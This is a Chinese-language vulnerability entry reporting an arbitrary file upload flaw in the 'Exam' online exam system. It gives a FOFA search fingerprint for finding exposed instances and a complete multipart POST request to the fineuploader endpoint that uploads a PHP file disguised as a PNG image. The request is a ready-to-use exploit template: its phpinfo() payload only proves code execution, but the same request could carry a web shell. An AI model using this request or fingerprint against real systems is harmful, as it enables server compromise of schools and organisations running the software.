## Exam在线考试系统存在前台任意文件上传漏洞

Exam在线考试系统是一种现代地，全新的考试模型。它使用户可根据自身特点快速构建考试、测评、练习、竞赛、调查、分析及管理于一体的网络化考试平台，可轻松完成全员考试，问卷调查以及知识竞赛等工作，uploadFile接口存在任意文件上传漏洞，导致获取服务器权限。

## fofa

```
"app/core/styles/js/jquery.min.js"
```

## poc

```yaml
POST /index.php?document-api-fineuploader HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 198
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygfd0H3RWDeNNLaPy
Host: 127.0.0.1
Origin: http://127.0.0.1
Referer: http://127.0.0.1/index.php?document-api-fineuploader
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

------WebKitFormBoundarye776qKJKlcGtVlH5
Content-Disposition: form-data; name="qqfile"; filename="1.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundarye776qKJKlcGtVlH5--
```

![image-20240708111744898](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407081117994.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/KXcBpZ5rcdnHLey--NXQfg